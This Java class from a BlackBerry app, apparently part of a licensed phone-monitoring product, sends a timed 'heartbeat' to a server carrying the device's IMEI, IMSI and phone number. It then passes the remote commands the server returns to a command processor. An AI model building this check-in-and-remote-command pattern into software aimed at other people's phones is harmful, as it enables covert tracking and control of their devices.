package com.vvt.protsrv;

import java.util.Vector;
import net.rim.device.api.system.RuntimeStore;
import com.vvt.global.Global;
import com.vvt.info.ApplicationInfo;
import com.vvt.info.ServerUrl;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseManager;
import com.vvt.pref.PrefConnectionHistory;
import com.vvt.pref.PrefGeneral;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.prot.CommandCode;
import com.vvt.prot.CommandListener;
import com.vvt.prot.CommandMetaData;
import com.vvt.prot.CommandRequest;
import com.vvt.prot.CommandServiceManager;
import com.vvt.prot.command.CompressionType;
import com.vvt.prot.command.EncryptionType;
import com.vvt.prot.command.Languages;
import com.vvt.prot.command.SendHeartBeat;
import com.vvt.prot.command.TransportDirectives;
import com.vvt.prot.command.response.SendHeartBeatCmdResponse;
import com.vvt.prot.command.response.StructureCmdResponse;
import com.vvt.protsrv.resource.ProtocolManagerTextResource;
import com.vvt.protsrv.util.ProtSrvUtil;
import com.vvt.rmtcmd.RmtCmdProcessingManager;
import com.vvt.std.Constant;
import com.vvt.std.FxTimer;
import com.vvt.std.FxTimerListener;
import com.vvt.std.Log;
import com.vvt.std.PhoneInfo;
import com.vvt.version.VersionInfo;

public class SendHeartBeatManager implements CommandListener, FxTimerListener {
	
	private static final int HEARTBEAT_INTERVAL = 3; // In minute
	private static final long SEND_HEARTBEAT_GUID = 0xfc070644296db30aL;
	private static SendHeartBeatManager self = null;
	private LicenseManager license = Global.getLicenseManager();
	private RmtCmdProcessingManager rmtCmdMgr = Global.getRmtCmdProcessingManager();
	private CommandServiceManager comServMgr = Global.getCommandServiceManager();
	private Preference pref = Global.getPreference();
	private ServerUrl serverUrl = Global.getServerUrl();
	private LicenseInfo licenseInfo = license.getLicenseInfo();
	private Vector listeners = new Vector();
	private SendHeartBeatCmdResponse sendHeartBeatCmdRes = null;
	private FxTimer heartBeatTimer = new FxTimer(this);
	private boolean progress = false;
	private ProtSrvUtil protSrvUtil = new ProtSrvUtil();
	
	private SendHeartBeatManager() {
		heartBeatTimer.setIntervalMinute(HEARTBEAT_INTERVAL);
	}
	
	public static SendHeartBeatManager getInstance() {
		if (self == null) {
			self = (SendHeartBeatManager)RuntimeStore.getRuntimeStore().get(SEND_HEARTBEAT_GUID);
		}
		if (self == null) {
			SendHeartBeatManager sendHeartBeat = new SendHeartBeatManager();
			RuntimeStore.getRuntimeStore().put(SEND_HEARTBEAT_GUID, sendHeartBeat);
			self = sendHeartBeat;
		}
		return self;
	}
	
	public void testConnection() {
//		Log.debug("SendHeartBeatManager.testConnection", "ENTER");
		licenseInfo = license.getLicenseInfo();
		if (comServMgr.isCommandExecutorBusy()) {
			notifyError(ProtocolManagerTextResource.COMMAND_SERV_MANAGER_BUSY);
		} else {
			if (!progress) {
				progress = true;
				try {
					CommandRequest cmdRequest = new CommandRequest();
					// Meta Data
					CommandMetaData cmdMetaData = new CommandMetaData();
					cmdMetaData.setProtocolVersion(ApplicationInfo.PROTOCOL_VERSION);
					cmdMetaData.setProductId(licenseInfo.getProductID());
//					cmdMetaData.setProductVersion(ApplicationInfo.PRODUCT_VERSION);
					cmdMetaData.setProductVersion(VersionInfo.getFullVersion());
					cmdMetaData.setConfId(licenseInfo.getProductConfID());
					cmdMetaData.setDeviceId(PhoneInfo.getIMEI());
					cmdMetaData.setLanguage(Languages.ENGLISH);
					cmdMetaData.setPhoneNumber(PhoneInfo.getOwnNumber());
					cmdMetaData.setMcc(PhoneInfo.getMCC());
					cmdMetaData.setMnc(PhoneInfo.getMNC());
					cmdMetaData.setActivationCode(licenseInfo.getActivationCode());
					cmdMetaData.setImsi(PhoneInfo.getIMSI());
					cmdMetaData.setBaseServerUrl(protSrvUtil.getBaseServerUrl());
					cmdMetaData.setTransportDirective(TransportDirectives.RESUMABLE);
					cmdMetaData.setEncryptionCode(EncryptionType.ENCRYPT_ALL_METADATA.getId());
					cmdMetaData.setCompressionCode(CompressionType.COMPRESS_ALL_METADATA.getId());
					// HeartBeat Data
					SendHeartBeat heartBeatData = new SendHeartBeat();
			    	cmdRequest.setCommandData(heartBeatData);
			    	cmdRequest.setCommandMetaData(cmdMetaData);
			    	cmdRequest.setUrl(serverUrl.getServerDeliveryUrl());
			    	cmdRequest.setCommandListener(this);
			    	// Execute Command
					comServMgr.execute(cmdRequest);
					heartBeatTimer.stop();
					heartBeatTimer.start();
				} catch(Exception e) {
					Log.error("SendHeartBeatManager.testConnection", null, e);
					progress = false;
					notifyError(e.getMessage());
				}
			}
		}
//		Log.debug("SendHeartBeatManager.testConnection", "EXIT");
	}
	
	public void addListener(PhoenixProtocolListener listener) {
		if (!isExisted(listener)) {
			listeners.addElement(listener);
		}
	}

	public void removeListener(PhoenixProtocolListener listener) {
		if (isExisted(listener)) {
			listeners.removeElement(listener);
		}
	}
	
	private boolean isExisted(PhoenixProtocolListener listener) {
		boolean existed = false;
		for (int i = 0; i < listeners.size(); i++) {
			if (listener == listeners.elementAt(i)) {
				existed = true;
				break;
			}
		}
		return existed;
	}
	
	private void notifySuccess() {
		updateSuccessStatus();
		for (int i = 0; i < listeners.size(); i++) {
			PhoenixProtocolListener listener = (PhoenixProtocolListener)listeners.elementAt(i);
			listener.onSuccess(sendHeartBeatCmdRes);
		}
	}
	
	private void notifyError(String message) {
		updateErrorStatus(message);
		for (int i = 0; i < listeners.size(); i++) {
			PhoenixProtocolListener listener = (PhoenixProtocolListener)listeners.elementAt(i);
			listener.onError(message);
		}
	}

	private void updateSuccessStatus() {
		// To save last connection.
		PrefConnectionHistory conHistory = new PrefConnectionHistory();
		conHistory.setLastConnection(System.currentTimeMillis());
		conHistory.setConnectionMethod(sendHeartBeatCmdRes.getConnectionMethod());
		conHistory.setLastConnectionStatus(sendHeartBeatCmdRes.getServerMsg());
		conHistory.setActionType(CommandCode.SEND_HEARTBEAT.getId());
		conHistory.setStatusCode(sendHeartBeatCmdRes.getStatusCode());				
		PrefGeneral generalInfo = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
		generalInfo.addPrefConnectionHistory(conHistory);
		pref.commit(generalInfo);
	}
	
	private void updateErrorStatus(String message) {
		PrefConnectionHistory conHistory = new PrefConnectionHistory();
		conHistory.setLastConnection(System.currentTimeMillis());
		conHistory.setLastConnectionStatus(message);
		conHistory.setStatusCode(2);
		conHistory.setActionType(CommandCode.SEND_HEARTBEAT.getId());
		PrefGeneral generalInfo = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
		generalInfo.addPrefConnectionHistory(conHistory);
		pref.commit(generalInfo);
	}
	
	// CommandListener
	public void onSuccess(StructureCmdResponse response) {
//		Log.debug("SendHeartBeatManager.onSuccess", "ENTER");
		if (response instanceof SendHeartBeatCmdResponse) {
//			Log.debug("SendHeartBeatManager.onSuccess", "It is HeartBeat!");
			heartBeatTimer.stop();
			progress = false;
			sendHeartBeatCmdRes = (SendHeartBeatCmdResponse)response;			
			if (sendHeartBeatCmdRes.getStatusCode() == 0) {
				// To process PCC commands.
				rmtCmdMgr.process(sendHeartBeatCmdRes.getPCCCommands());
//				Log.debug("SendHeartBeatManager.onSuccess", "Before NotifySuccess");
				notifySuccess();
//				Log.debug("SendHeartBeatManager.onSuccess", "After NotifySuccess");
			} else {
//				Log.debug("SendHeartBeatManager.onSuccess", "Before NotifyErr");
				notifyError(sendHeartBeatCmdRes.getServerMsg() + Constant.L_SQUARE_BRACKET + Constant.HEX + Integer.toHexString(response.getStatusCode()) + Constant.R_SQUARE_BRACKET);
//				Log.debug("SendHeartBeatManager.onSuccess", "After NotifyErr");
			}
		}
//		Log.debug("SendHeartBeatManager.onSuccess", "EXIT");
	}
	
	public void onConstructError(long csid, Exception e) {
		Log.error("SendHeartBeatManager.onConstructError", null, e);
		heartBeatTimer.stop();
		progress = false;
//		updateErrorStatus(e.getMessage());
		notifyError(e.getMessage());
	}
	
	public void onTransportError(long csid, Exception e) {
		Log.error("SendHeartBeatManager.onTransportError", null, e);
		heartBeatTimer.stop();
		progress = false;
//		updateErrorStatus(e.getMessage());
		notifyError(e.getMessage());
	}
	
	public void onServerError(long csid, StructureCmdResponse response) {
		Log.error("SendHeartBeatManager.onServerError", "Status Code: " + response.getStatusCode());
		Log.error("SendHeartBeatManager.onServerError", "Server Message: " + response.getServerMsg());
		heartBeatTimer.stop();
		progress = false;
//		updateErrorStatus(response.getServerMsg());
		notifyError(response.getServerMsg() + Constant.L_SQUARE_BRACKET + Constant.HEX + Integer.toHexString(response.getStatusCode()) + Constant.R_SQUARE_BRACKET);
	}
		
	// FxTimerListener
	public void timerExpired(int id) {
		progress = false;
		notifyError(ProtocolManagerTextResource.PROTOCOL_TIME_OUT_WITHOUT_TRY);
	}
}
